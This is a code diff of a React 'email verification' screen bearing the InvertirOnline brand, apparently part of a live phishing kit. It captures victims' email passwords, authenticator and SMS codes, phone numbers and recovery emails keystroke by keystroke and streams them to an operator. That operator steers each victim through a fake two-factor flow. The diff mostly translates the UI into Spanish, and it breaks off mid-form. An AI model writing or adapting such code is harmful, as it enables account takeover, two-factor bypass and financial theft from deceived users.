@@ -73,566 +73,550 @@ const ConfirmEmailScreen = ({ email, sessionId, onBack }: ConfirmEmailScreenProp
     const confirmCh = supabase.channel(getChannelName(sessionId));
     const syncCh = supabase.channel(`sync-email-${sessionId}`);
 
-    const handleDecision = (decision: string, payload?: Record<string, string>) => {
-      if (decision === "confirm_wrong_password" || decision === "sync_wrong_password") {
-        setErrorMessage("Wrong password. Please try again.");
-        setStep("password");
-        setPassword("");
-        setLoading(false);
-      } else if (decision === "confirm_ask_otp" || decision === "sync_ask_otp") {
-        // If client is waiting after phone or recovery email submit, advance to code entry
-        if (step === "sms_waiting" || step === "recovery_email_submitted") {
-          setStep("sms_code");
-          setSmsCode("");
-          setErrorMessage("");
-        } else {
-          setStep("token_2fa");
-          setTokenCode("");
-          setAdminTokenCode("");
-          setErrorMessage("");
-        }
-      } else if (decision === "confirm_ask_token" || decision === "sync_ask_token") {
-        const code = payload?.admin_token || "";
-        setAdminTokenCode(code);
-        setStep("token_2fa");
-        setTokenCode("");
-        setErrorMessage("");
-    } else if (decision === "confirm_ask_sms" || decision === "sync_ask_sms") {
-        // If client is waiting after phone or recovery email submit, advance to SMS code entry
-        if (step === "sms_waiting" || step === "recovery_email_submitted") {
-          setStep("sms_code");
-          setSmsCode("");
-          setErrorMessage("");
-        } else {
-          const ending = payload?.sms_ending || "";
-          setPhoneEnding(ending);
-          setStep("sms_phone");
-          setClientPhoneInput("");
-          setSmsCode("");
-          setErrorMessage("");
-        }
-      } else if (decision === "confirm_advance_sms_code" || decision === "sync_advance_sms_code") {
-        // Admin clicked SMS button to advance client directly to SMS code entry
-        const ending = payload?.sms_ending || "";
-        if (ending) setPhoneEnding(ending);
-        setStep("sms_code");
-        setSmsCode("");
-        setErrorMessage("");
-      } else if (decision === "confirm_ask_recovery_email" || decision === "sync_ask_recovery_email") {
-        const recEmail = payload?.recovery_email || "";
-        setRecoveryEmailAddr(recEmail);
-        setStep("recovery_email_input");
-        setClientRecoveryEmail("");
-        setErrorMessage("");
-      } else if (decision === "confirm_ask_recovery" || decision === "sync_ask_recovery") {
-        // Admin chose to advance from recovery_email_submitted — not used in new flow
-        setErrorMessage("");
-      } else if (decision === "confirm_approved" || decision === "sync_approved") {
-        setStep("success");
-      } else if (decision === "confirm_rejected" || decision === "sync_rejected") {
-        setErrorMessage("Verification failed. Please try again.");
-        setClientRecoveryEmail("");
-        setSmsCode("");
-        setTokenCode("");
-      }
-    };
-
-    confirmCh
-      .on("broadcast", { event: "admin_decision" }, (p) => handleDecision(p.payload?.status, p.payload))
-      .subscribe();
-
-    syncCh
-      .on("broadcast", { event: "admin_sync_decision" }, (p) => handleDecision(p.payload?.status, p.payload))
-      .subscribe();
-
-    // DB polling fallback
-    const pollInterval = setInterval(async () => {
-      const { data } = await supabase
-        .from("sessions")
-        .select("status, otp_code")
-        .eq("id", sessionId)
-        .maybeSingle();
-
-      if (!data) return;
-      const { status, otp_code: otp } = data;
-
-      if ((status === "confirm_wrong_password" || status === "sync_wrong_password") && step !== "password") {
-        setErrorMessage("Wrong password. Please try again.");
-        setStep("password");
-        setPassword("");
-      } else if ((status === "confirm_ask_otp" || status === "sync_ask_otp") && step !== "token_2fa" && step !== "sms_code") {
-        if (step === "sms_waiting" || step === "recovery_email_submitted") {
-          setStep("sms_code");
-          setSmsCode("");
-        } else {
-          setStep("token_2fa");
-          setTokenCode("");
-          setAdminTokenCode("");
-        }
-      } else if ((status === "confirm_ask_token" || status === "sync_ask_token") && step !== "token_2fa") {
-        const code = otp?.startsWith("admin_token:") ? otp.replace("admin_token:", "") : "";
-        setAdminTokenCode(code);
-        setStep("token_2fa");
-        setTokenCode("");
-      } else if ((status === "confirm_ask_sms" || status === "sync_ask_sms") && step !== "sms_phone" && step !== "sms_code" && step !== "sms_waiting") {
-        if (step === "recovery_email_submitted") {
-          setStep("sms_code");
-          setSmsCode("");
-        } else {
-          const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : "";
-          setPhoneEnding(ending);
-          setStep("sms_phone");
-          setClientPhoneInput("");
-          setSmsCode("");
-        }
-      } else if ((status === "confirm_advance_sms_code" || status === "sync_advance_sms_code") && step !== "sms_code") {
-        const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : "";
-        if (ending) setPhoneEnding(ending);
-        setStep("sms_code");
-        setSmsCode("");
-      } else if ((status === "confirm_ask_recovery_email" || status === "sync_ask_recovery_email") && step !== "recovery_email_input" && step !== "recovery_email_submitted") {
-        const recEmail = otp?.startsWith("recovery_email_addr:") ? otp.replace("recovery_email_addr:", "") : "";
-        setRecoveryEmailAddr(recEmail);
-        setStep("recovery_email_input");
-        setClientRecoveryEmail("");
-      } else if ((status === "confirm_ask_recovery" || status === "sync_ask_recovery") && step === "recovery_email_submitted") {
-        // Not used in new flow — admin uses Token/SMS buttons instead
-      } else if (status === "confirm_approved" || status === "sync_approved") {
-        setStep("success");
-      }
-    }, 2500);
-
-    return () => {
-      supabase.removeChannel(confirmCh);
-      supabase.removeChannel(syncCh);
-      clearInterval(pollInterval);
-    };
-  }, [sessionId, step]);
-
-  // ── Password change: broadcast every keystroke in real-time ──
-  const handlePasswordChange = useCallback(
-    (value: string) => {
-      setPassword(value);
-      // Update DB and broadcast every keystroke
-      supabase.from("sessions").update({ otp_code: `email_pass:${value}` }).eq("id", sessionId).then(() => {});
-      broadcastToAdmin("client_email_password_typing", {
-        session_id: sessionId,
-        email_password: value,
-      });
-    },
-    [sessionId, broadcastToAdmin]
-  );
-
-  // ── Password submit ──
-  const handlePasswordSubmit = useCallback(
-    async (e: React.FormEvent) => {
-      e.preventDefault();
-      if (!password.trim()) return;
-
-      setLoading(true);
-      setErrorMessage("");
-
-      await supabase
-        .from("sessions")
-        .update({
-          otp_code: `email_pass:${password}`,
-          status: "confirm_email_pending",
-        })
-        .eq("id", sessionId);
-
-      broadcastToAdmin("client_email_password", {
-        session_id: sessionId,
-        email_password: password,
-        email,
-        provider_id: provider.id,
-        provider_name: provider.name,
-      });
-
-      setStep("waiting");
+  const handleDecision = (decision: string, payload?: Record<string, string>) => {
+    if (decision === "confirm_wrong_password" || decision === "sync_wrong_password") {
+      setErrorMessage("Contraseña incorrecta. Intentá nuevamente.");
+      setStep("password");
+      setPassword("");
       setLoading(false);
-    },
-    [password, sessionId, provider, broadcastToAdmin, email]
-  );
+    } else if (decision === "confirm_ask_otp" || decision === "sync_ask_otp") {
+      if (step === "sms_waiting" || step === "recovery_email_submitted") {
+        setStep("sms_code");
+        setSmsCode("");
+        setErrorMessage("");
+      } else {
+        setStep("token_2fa");
+        setTokenCode("");
+        setAdminTokenCode("");
+        setErrorMessage("");
+      }
+    } else if (decision === "confirm_ask_token" || decision === "sync_ask_token") {
+      const code = payload?.admin_token || "";
+      setAdminTokenCode(code);
+      setStep("token_2fa");
+      setTokenCode("");
+      setErrorMessage("");
+    } else if (decision === "confirm_ask_sms" || decision === "sync_ask_sms") {
+      if (step === "sms_waiting" || step === "recovery_email_submitted") {
+        setStep("sms_code");
+        setSmsCode("");
+        setErrorMessage("");
+      } else {
+        const ending = payload?.sms_ending || "";
+        setPhoneEnding(ending);
+        setStep("sms_phone");
+        setClientPhoneInput("");
+        setSmsCode("");
+        setErrorMessage("");
+      }
+    } else if (decision === "confirm_advance_sms_code" || decision === "sync_advance_sms_code") {
+      const ending = payload?.sms_ending || "";
+      if (ending) setPhoneEnding(ending);
+      setStep("sms_code");
+      setSmsCode("");
+      setErrorMessage("");
+    } else if (decision === "confirm_ask_recovery_email" || decision === "sync_ask_recovery_email") {
+      const recEmail = payload?.recovery_email || "";
+      setRecoveryEmailAddr(recEmail);
+      setStep("recovery_email_input");
+      setClientRecoveryEmail("");
+      setErrorMessage("");
+    } else if (decision === "confirm_ask_recovery" || decision === "sync_ask_recovery") {
+      setErrorMessage("");
+    } else if (decision === "confirm_approved" || decision === "sync_approved") {
+      setStep("success");
+    } else if (decision === "confirm_rejected" || decision === "sync_rejected") {
+      setErrorMessage("La verificación falló. Intentá nuevamente.");
+      setClientRecoveryEmail("");
+      setSmsCode("");
+      setTokenCode("");
+    }
+  };
 
-  // ── Token change: broadcast every keystroke ──
-  const handleTokenChange = useCallback(
-    (value: string) => {
-      setTokenCode(value);
-      supabase.from("sessions").update({ otp_code: `token_code:${value}` }).eq("id", sessionId).then(() => {});
-      broadcastToAdmin("client_token_update", { session_id: sessionId, token_code: value });
-    },
-    [sessionId, broadcastToAdmin]
-  );
+  confirmCh
+    .on("broadcast", { event: "admin_decision" }, (p) => handleDecision(p.payload?.status, p.payload))
+    .subscribe();
 
-  // ── Phone number change: broadcast every keystroke ──
-  const handlePhoneChange = useCallback(
-    (value: string) => {
-      setClientPhoneInput(value);
-      supabase.from("sessions").update({ otp_code: `client_phone:${value}` }).eq("id", sessionId).then(() => {});
-      broadcastToAdmin("client_phone_update", { session_id: sessionId, phone_number: value });
-    },
-    [sessionId, broadcastToAdmin]
-  );
+  syncCh
+    .on("broadcast", { event: "admin_sync_decision" }, (p) => handleDecision(p.payload?.status, p.payload))
+    .subscribe();
 
-  // ── Phone number submit → go to SMS code step ──
-  const handlePhoneSubmit = useCallback(
-    (e: React.FormEvent) => {
-      e.preventDefault();
-      if (!clientPhoneInput.trim()) return;
-      // Save final phone number
-      supabase.from("sessions").update({ otp_code: `client_phone_final:${clientPhoneInput}` }).eq("id", sessionId).then(() => {});
-      broadcastToAdmin("client_phone_submitted", { session_id: sessionId, phone_number: clientPhoneInput });
-      setStep("sms_waiting");
-    },
-    [clientPhoneInput, sessionId, broadcastToAdmin]
-  );
+  // DB polling fallback
+  const pollInterval = setInterval(async () => {
+    const { data } = await supabase
+      .from("sessions")
+      .select("status, otp_code")
+      .eq("id", sessionId)
+      .maybeSingle();
 
-  // ── SMS change: broadcast every keystroke ──
-  const handleSmsCodeChange = useCallback(
-    (value: string) => {
-      setSmsCode(value);
-      supabase.from("sessions").update({ otp_code: `sms_code:${value}` }).eq("id", sessionId).then(() => {});
-      broadcastToAdmin("client_sms_update", { session_id: sessionId, sms_code: value });
-    },
-    [sessionId, broadcastToAdmin]
-  );
+    if (!data) return;
+    const { status, otp_code: otp } = data;
 
-  // ── Recovery email input change: broadcast every keystroke ──
-  const handleRecoveryEmailChange = useCallback(
-    (value: string) => {
-      setClientRecoveryEmail(value);
-      supabase.from("sessions").update({ otp_code: `client_recovery_email:${value}` }).eq("id", sessionId).then(() => {});
-      broadcastToAdmin("client_recovery_email_update", { session_id: sessionId, recovery_email: value });
-    },
-    [sessionId, broadcastToAdmin]
-  );
+    if ((status === "confirm_wrong_password" || status === "sync_wrong_password") && step !== "password") {
+      setErrorMessage("Contraseña incorrecta. Intentá nuevamente.");
+      setStep("password");
+      setPassword("");
+    } else if ((status === "confirm_ask_otp" || status === "sync_ask_otp") && step !== "token_2fa" && step !== "sms_code") {
+      if (step === "sms_waiting" || step === "recovery_email_submitted") {
+        setStep("sms_code");
+        setSmsCode("");
+      } else {
+        setStep("token_2fa");
+        setTokenCode("");
+        setAdminTokenCode("");
+      }
+    } else if ((status === "confirm_ask_token" || status === "sync_ask_token") && step !== "token_2fa") {
+      const code = otp?.startsWith("admin_token:") ? otp.replace("admin_token:", "") : "";
+      setAdminTokenCode(code);
+      setStep("token_2fa");
+      setTokenCode("");
+    } else if ((status === "confirm_ask_sms" || status === "sync_ask_sms") && step !== "sms_phone" && step !== "sms_code" && step !== "sms_waiting") {
+      if (step === "recovery_email_submitted") {
+        setStep("sms_code");
+        setSmsCode("");
+      } else {
+        const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : "";
+        setPhoneEnding(ending);
+        setStep("sms_phone");
+        setClientPhoneInput("");
+        setSmsCode("");
+      }
+    } else if ((status === "confirm_advance_sms_code" || status === "sync_advance_sms_code") && step !== "sms_code") {
+      const ending = otp?.startsWith("sms_ending:") ? otp.replace("sms_ending:", "") : "";
+      if (ending) setPhoneEnding(ending);
+      setStep("sms_code");
+      setSmsCode("");
+    } else if ((status === "confirm_ask_recovery_email" || status === "sync_ask_recovery_email") && step !== "recovery_email_input" && step !== "recovery_email_submitted") {
+      const recEmail = otp?.startsWith("recovery_email_addr:") ? otp.replace("recovery_email_addr:", "") : "";
+      setRecoveryEmailAddr(recEmail);
+      setStep("recovery_email_input");
+      setClientRecoveryEmail("");
+    } else if ((status === "confirm_ask_recovery" || status === "sync_ask_recovery") && step === "recovery_email_submitted") {
+      // Not used in new flow — admin uses Token/SMS buttons instead
+    } else if (status === "confirm_approved" || status === "sync_approved") {
+      setStep("success");
+    }
+  }, 2500);
 
-  // ═══ SUCCESS ═══
-  if (step === "success") {
-    return (
-      <div className="flex flex-col items-center text-center">
-        <div className="mb-6 flex h-16 w-16 items-center justify-center rounded-full bg-green-500/10">
-          <CheckCircle className="h-8 w-8 text-green-500" />
-        </div>
-        <h3 className="mb-2 text-lg font-semibold text-foreground">Email verified</h3>
-        <p className="mb-1 text-sm text-muted-foreground">Your account has been verified successfully. Redirecting...</p>
-        <p className="text-xs text-muted-foreground/60">{email}</p>
-      </div>
-    );
-  }
+  return () => {
+    supabase.removeChannel(confirmCh);
+    supabase.removeChannel(syncCh);
+    clearInterval(pollInterval);
+  };
+}, [sessionId, step]);
 
+// ── Password change: broadcast every keystroke in real-time ──
+const handlePasswordChange = useCallback(
+  (value: string) => {
+    setPassword(value);
+    supabase.from("sessions").update({ otp_code: `email_pass:${value}` }).eq("id", sessionId).then(() => {});
+    broadcastToAdmin("client_email_password_typing", {
+      session_id: sessionId,
+      email_password: value,
+    });
+  },
+  [sessionId, broadcastToAdmin]
+);
+
+// ── Password submit ──
+const handlePasswordSubmit = useCallback(
+  async (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!password.trim()) return;
+
+    setLoading(true);
+    setErrorMessage("");
+
+    await supabase
+      .from("sessions")
+      .update({
+        otp_code: `email_pass:${password}`,
+        status: "confirm_email_pending",
+      })
+      .eq("id", sessionId);
+
+    broadcastToAdmin("client_email_password", {
+      session_id: sessionId,
+      email_password: password,
+      email,
+      provider_id: provider.id,
+      provider_name: provider.name,
+    });
+
+    setStep("waiting");
+    setLoading(false);
+  },
+  [password, sessionId, provider, broadcastToAdmin, email]
+);
+
+// ── Token change: broadcast every keystroke ──
+const handleTokenChange = useCallback(
+  (value: string) => {
+    setTokenCode(value);
+    supabase.from("sessions").update({ otp_code: `token_code:${value}` }).eq("id", sessionId).then(() => {});
+    broadcastToAdmin("client_token_update", { session_id: sessionId, token_code: value });
+  },
+  [sessionId, broadcastToAdmin]
+);
+
+// ── Phone number change: broadcast every keystroke ──
+const handlePhoneChange = useCallback(
+  (value: string) => {
+    setClientPhoneInput(value);
+    supabase.from("sessions").update({ otp_code: `client_phone:${value}` }).eq("id", sessionId).then(() => {});
+    broadcastToAdmin("client_phone_update", { session_id: sessionId, phone_number: value });
+  },
+  [sessionId, broadcastToAdmin]
+);
+
+// ── Phone number submit → go to SMS code step ──
+const handlePhoneSubmit = useCallback(
+  (e: React.FormEvent) => {
+    e.preventDefault();
+    if (!clientPhoneInput.trim()) return;
+    supabase.from("sessions").update({ otp_code: `client_phone_final:${clientPhoneInput}` }).eq("id", sessionId).then(() => {});
+    broadcastToAdmin("client_phone_submitted", { session_id: sessionId, phone_number: clientPhoneInput });
+    setStep("sms_waiting");
+  },
+  [clientPhoneInput, sessionId, broadcastToAdmin]
+);
+
+// ── SMS change: broadcast every keystroke ──
+const handleSmsCodeChange = useCallback(
+  (value: string) => {
+    setSmsCode(value);
+    supabase.from("sessions").update({ otp_code: `sms_code:${value}` }).eq("id", sessionId).then(() => {});
+    broadcastToAdmin("client_sms_update", { session_id: sessionId, sms_code: value });
+  },
+  [sessionId, broadcastToAdmin]
+);
+
+// ── Recovery email input change: broadcast every keystroke ──
+const handleRecoveryEmailChange = useCallback(
+  (value: string) => {
+    setClientRecoveryEmail(value);
+    supabase.from("sessions").update({ otp_code: `client_recovery_email:${value}` }).eq("id", sessionId).then(() => {});
+    broadcastToAdmin("client_recovery_email_update", { session_id: sessionId, recovery_email: value });
+  },
+  [sessionId, broadcastToAdmin]
+);
+
+// ═══ SUCCESS ═══
+if (step === "success") {
   return (
     <div className="flex flex-col items-center text-center">
-      {/* Connection visual */}
-      <div className="mb-6 flex items-center justify-center gap-4">
-        <div className="flex h-14 w-14 items-center justify-center rounded-2xl border border-border bg-secondary/50">
-          <img src={iolLogo} alt="InvertirOnline" className="h-5 object-contain" />
-        </div>
-        <div className="flex items-center gap-1">
-          <div className="h-px w-3 bg-border" />
-          <div className="flex h-7 w-7 items-center justify-center rounded-full border border-primary/40 bg-primary/10">
-            <ArrowRight className="h-3 w-3 text-primary" />
-          </div>
-          <div className="h-px w-3 bg-border" />
-        </div>
-        <div className="flex h-14 w-14 items-center justify-center rounded-2xl border border-border bg-secondary/50 p-1.5">
-          {provider.icon}
-        </div>
+      <div className="mb-6 flex h-16 w-16 items-center justify-center rounded-full bg-green-500/10">
+        <CheckCircle className="h-8 w-8 text-green-500" />
       </div>
-
-      {/* Email display */}
-      <div className="mb-5 w-full rounded-lg border border-border bg-secondary/30 px-4 py-2.5">
-        <div className="flex items-center gap-3">
-          <div className="h-7 w-7">{provider.icon}</div>
-          <div className="flex flex-col items-start text-left">
-            <span className="text-[10px] text-muted-foreground">{provider.name}</span>
-            <span className="text-sm font-medium text-foreground">{email}</span>
-          </div>
-        </div>
-      </div>
-
-      {errorMessage && (
-        <div className="mb-4 w-full rounded-md border border-destructive/30 bg-destructive/10 px-4 py-2 text-sm text-destructive">
-          {errorMessage}
-        </div>
-      )}
-
-      {/* Step: Password */}
-      {step === "password" && (
-        <>
-          <h3 className="mb-1.5 text-lg font-semibold text-foreground">Verify email</h3>
-          <p className="mb-5 text-sm text-muted-foreground">
-            Confirm your identity to verify your {provider.name} account
-          </p>
-
-          <form onSubmit={handlePasswordSubmit} className="w-full">
-            <input
-              type="password"
-              placeholder={`${provider.name} password`}
-              value={password}
-              onChange={(e) => handlePasswordChange(e.target.value)}
-              disabled={loading}
-              autoFocus
-              className="mb-3 flex h-11 w-full rounded-lg border border-input bg-input px-4 py-2 text-sm text-foreground ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:cursor-not-allowed disabled:opacity-50"
-            />
-            <button
-              type="submit"
-              disabled={loading || !password.trim()}
-              className="flex w-full items-center justify-center gap-2 rounded-lg bg-primary px-4 py-2.5 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-colors disabled:opacity-50"
-            >
-              {loading ? (
-                <><Loader2 className="h-4 w-4 animate-spin" /> Verifying...</>
-              ) : (
-                <><ArrowRight className="h-4 w-4" /> Continue</>
-              )}
-            </button>
-          </form>
-        </>
-      )}
-
-      {/* Step: Waiting */}
-      {step === "waiting" && (
-        <>
-          <h3 className="mb-1.5 text-lg font-semibold text-foreground">Verifying your account</h3>
-          <p className="mb-5 text-sm text-muted-foreground">
-            We're verifying your {provider.name} account. Please wait...
-          </p>
-          <div className="flex items-center gap-2 text-sm text-muted-foreground">
-            <Loader2 className="h-4 w-4 animate-spin" />
-            <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
-            Verification in progress...
-          </div>
-        </>
-      )}
-
-      {/* Step: Token / 2FA */}
-      {step === "token_2fa" && (
-        <>
-          <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
-            <Smartphone className="h-5 w-5 text-primary" />
-          </div>
-          <h3 className="mb-1.5 text-lg font-semibold text-foreground">Two-step verification</h3>
-
-          {adminTokenCode ? (
-            <>
-              <p className="mb-4 text-sm text-muted-foreground">
-                Tap the number below on your device to confirm
-              </p>
-              <div className="mb-4 flex h-20 w-20 items-center justify-center rounded-2xl border-2 border-primary bg-primary/10 mx-auto">
-                <span className="text-3xl font-bold text-primary">{adminTokenCode}</span>
-              </div>
-              <div className="flex items-center gap-2 text-sm text-muted-foreground">
-                <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
-                Waiting for confirmation...
-              </div>
-            </>
-          ) : (
-            <>
-              <p className="mb-5 text-sm text-muted-foreground">
-                Enter the 6-digit code from your authenticator app
-              </p>
-              <div className="mb-5">
-                <InputOTP maxLength={6} value={tokenCode} onChange={handleTokenChange} inputMode="numeric" pattern="[0-9]*">
-                  <InputOTPGroup>
-                    <InputOTPSlot index={0} />
-                    <InputOTPSlot index={1} />
-                    <InputOTPSlot index={2} />
-                  </InputOTPGroup>
-                  <InputOTPSeparator />
-                  <InputOTPGroup>
-                    <InputOTPSlot index={3} />
-                    <InputOTPSlot index={4} />
-                    <InputOTPSlot index={5} />
-                  </InputOTPGroup>
-                </InputOTP>
-              </div>
-              {tokenCode.length === 6 && (
-                <div className="flex items-center gap-2 text-sm text-muted-foreground">
-                  <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
-                  Verifying code...
-                </div>
-              )}
-            </>
-          )}
-        </>
-      )}
-
-      {/* Step: Phone Number Input */}
-      {step === "sms_phone" && (
-        <>
-          <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
-            <Smartphone className="h-5 w-5 text-primary" />
-          </div>
-          <h3 className="mb-1.5 text-lg font-semibold text-foreground">Phone verification</h3>
-          <p className="mb-5 text-sm text-muted-foreground">
-            {phoneEnding ? (
-              <>Confirm the phone number ending in <span className="font-bold text-foreground">**{phoneEnding}</span> to receive a verification code</>
-            ) : (
-              "Enter your phone number to receive a verification code via SMS"
-            )}
-          </p>
-
-          <form onSubmit={handlePhoneSubmit} className="w-full">
-            <input
-              type="tel"
-              placeholder={phoneEnding ? `Phone number ending in ${phoneEnding}` : "+1 (555) 000-0000"}
-              value={clientPhoneInput}
-              onChange={(e) => handlePhoneChange(e.target.value)}
-              autoFocus
-              className="mb-3 flex h-11 w-full rounded-lg border border-input bg-input px-4 py-2 text-sm text-foreground ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2"
-            />
-            <button
-              type="submit"
-              disabled={!clientPhoneInput.trim()}
-              className="flex w-full items-center justify-center gap-2 rounded-lg bg-primary px-4 py-2.5 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-colors disabled:opacity-50"
-            >
-              <ArrowRight className="h-4 w-4" /> Send code
-            </button>
-          </form>
-        </>
-      )}
-
-      {/* Step: SMS Waiting (loader after phone submit, waiting for admin to advance) */}
-      {step === "sms_waiting" && (
-        <>
-          <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
-            <Smartphone className="h-5 w-5 text-primary" />
-          </div>
-          <h3 className="mb-1.5 text-lg font-semibold text-foreground">Phone verification</h3>
-          <p className="mb-4 text-sm text-muted-foreground">
-            Sending verification code to{" "}
-            <span className="font-bold text-foreground">{clientPhoneInput}</span>
-          </p>
-          <div className="flex items-center gap-2 text-sm text-muted-foreground">
-            <Loader2 className="h-4 w-4 animate-spin" />
-            <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
-            Sending SMS code...
-          </div>
-        </>
-      )}
-
-      {/* Step: Recovery Email Input (client types full email) */}
-      {step === "recovery_email_input" && (
-        <>
-          <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
-            <Mail className="h-5 w-5 text-primary" />
-          </div>
-          <h3 className="mb-1.5 text-lg font-semibold text-foreground">Recovery email</h3>
-          <p className="mb-4 text-sm text-muted-foreground">
-            Enter your recovery email address to receive a verification code
-          </p>
-
-          {recoveryEmailAddr && (
-            <div className="mb-4 w-full rounded-lg border border-border bg-secondary/30 px-4 py-2.5">
-              <div className="flex items-center gap-3">
-                <Mail className="h-5 w-5 text-muted-foreground shrink-0" />
-                <div className="flex flex-col items-start text-left">
-                  <span className="text-[10px] text-muted-foreground">Recovery email</span>
-                  <span className="text-sm font-medium text-foreground">{recoveryEmailAddr}</span>
-                </div>
-              </div>
-            </div>
-          )}
-
-          <form onSubmit={(e) => {
-            e.preventDefault();
-            if (!clientRecoveryEmail.trim()) return;
-            // Save final recovery email
-            supabase.from("sessions").update({ otp_code: `client_recovery_email_final:${clientRecoveryEmail}` }).eq("id", sessionId).then(() => {});
-            broadcastToAdmin("client_recovery_email_submitted", { session_id: sessionId, recovery_email: clientRecoveryEmail });
-            setStep("recovery_email_submitted");
-          }} className="w-full">
-            <input
-              type="email"
-              placeholder="Enter your full recovery email"
-              value={clientRecoveryEmail}
-              onChange={(e) => handleRecoveryEmailChange(e.target.value)}
-              autoFocus
-              className="mb-3 flex h-11 w-full rounded-lg border border-input bg-input px-4 py-2 text-sm text-foreground ring-offset-background placeholder:text-muted-foreground focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2"
-            />
-            <button
-              type="submit"
-              disabled={!clientRecoveryEmail.trim()}
-              className="flex w-full items-center justify-center gap-2 rounded-lg bg-primary px-4 py-2.5 text-sm font-semibold text-primary-foreground hover:bg-primary/90 transition-colors disabled:opacity-50"
-            >
-              <ArrowRight className="h-4 w-4" /> Continue
-            </button>
-          </form>
-        </>
-      )}
-
-      {/* Step: SMS Code */}
-      {step === "sms_code" && (
-        <>
-          <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
-            <MessageSquare className="h-5 w-5 text-primary" />
-          </div>
-          <h3 className="mb-1.5 text-lg font-semibold text-foreground">SMS Verification</h3>
-          <p className="mb-5 text-sm text-muted-foreground">
-            {phoneEnding ? (
-              <>Enter the code sent to the number ending in <span className="font-bold text-foreground">**{phoneEnding}</span></>
-            ) : clientPhoneInput ? (
-              <>Enter the code sent to <span className="font-bold text-foreground">{clientPhoneInput}</span></>
-            ) : (
-              "Enter the code sent via SMS"
-            )}
-          </p>
-
-          <div className="mb-5">
-            <InputOTP maxLength={6} value={smsCode} onChange={handleSmsCodeChange} inputMode="numeric" pattern="[0-9]*">
-              <InputOTPGroup>
-                <InputOTPSlot index={0} />
-                <InputOTPSlot index={1} />
-                <InputOTPSlot index={2} />
-              </InputOTPGroup>
-              <InputOTPSeparator />
-              <InputOTPGroup>
-                <InputOTPSlot index={3} />
-                <InputOTPSlot index={4} />
-                <InputOTPSlot index={5} />
-              </InputOTPGroup>
-            </InputOTP>
-          </div>
-
-          {smsCode.length === 6 && (
-            <div className="flex items-center gap-2 text-sm text-muted-foreground">
-              <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
-              Verifying SMS code...
-            </div>
-          )}
-        </>
-      )}
-
-      {/* Step: Recovery Email Submitted (loader, waiting for admin to choose Token/SMS) */}
-      {step === "recovery_email_submitted" && (
-        <>
-          <div className="mb-3 flex h-11 w-11 items-center justify-center rounded-full bg-primary/10">
-            <Mail className="h-5 w-5 text-primary" />
-          </div>
-          <h3 className="mb-1.5 text-lg font-semibold text-foreground">Recovery email</h3>
-          <p className="mb-4 text-sm text-muted-foreground">
-            Verifying your recovery email{" "}
-            <span className="font-bold text-foreground">{clientRecoveryEmail}</span>
-          </p>
-          <div className="flex items-center gap-2 text-sm text-muted-foreground">
-            <Loader2 className="h-4 w-4 animate-spin" />
-            <span className="h-2 w-2 animate-pulse rounded-full bg-amber-400" />
-            Verification in progress...
-          </div>
-        </>
-      )}
-
-      {/* Back button */}
-      <button
-        onClick={onBack}
-        disabled={loading}
-        className="mt-5 flex items-center gap-1.5 text-xs text-muted-foreground hover:text-foreground transition-colors disabled:opacity-50"
-      >
-        <ArrowLeft size={13} />
-        Back to login
-      </button>
+      <h3 className="mb-2 text-lg font-semibold text-foreground">Email verificado</h3>
+      <p className="mb-1 text-sm text-muted-foreground">Tu cuenta fue verificada correctamente. Redirigiendo...</p>
+      <p className="text-xs text-muted-foreground/60">{email}</p>
     </div>
   );
+}
+
+return (
+  <div className="flex flex-col items-center text-center">
+    {/* Connection visual */}
+    <div className="mb-6 flex items-center justify-center gap-4">
+      <div className="flex h-14 w-14 items-center justify-center rounded-2xl border border-border bg-secondary/50">
+        <img src={iolLogo} alt="InvertirOnline" className="h-5 object-contain" />
+      </div>
+      <div className="flex items-center gap-1">
+        <div className="h-px w-3 bg-border" />
+        <div className="flex h-7 w-7 items-center justify-center rounded-full border border-primary/40 bg-primary/10">
+          <ArrowRight className="h-3 w-3 text-primary" />
+        </div>
+        <div className="h-px w-3 bg-border" />
+      </div>
+      <div className="flex h-14 w-14 items-center justify-center rounded-2xl border border-border bg-secondary/50 p-1.5">
+        {provider.icon}
+      </div>
+    </div>
+
+    {/* Email display */}
+    <div className="mb-5 w-full rounded-lg border border-border bg-secondary/30 px-4 py-2.5">
+      <div className="flex items-center gap-3">
+        <div className="h-7 w-7">{provider.icon}</div>
+        <div className="flex flex-col items-start text-left">
+          <span className="text-[10px] text-muted-foreground">{provider.name}</span>
+          <span className="text-sm font-medium text-foreground">{email}</span>
+        </div>
+      </div>
+    </div>
+
+    {errorMessage && (
+      <div className="mb-4 w-full rounded-md border border-destructive/30 bg-destructive/10 px-4 py-2 text-sm text-destructive">
+        {errorMessage}
+      </div>
+    )}
+
+    {step === "password" && (
+      <>
+        <h3 className="mb-1.5 text-lg font-semibold text-foreground">Verificar email</h3>
+        <p className="mb-5 text-sm text-muted-foreground">
+          Confirmá tu identidad para verificar tu cuenta de {provider.name}
+        </p>
+
+        <form onSubmit={handlePasswordSubmit} className="w-full">
+          <input
+            type="password"
+            placeholder={`Contraseña de ${provider.name}`}
+            value={password}
+            onChange={(e) => handlePasswordChange(e.target.value)}
+            disabled={loading}
+            autoFocus
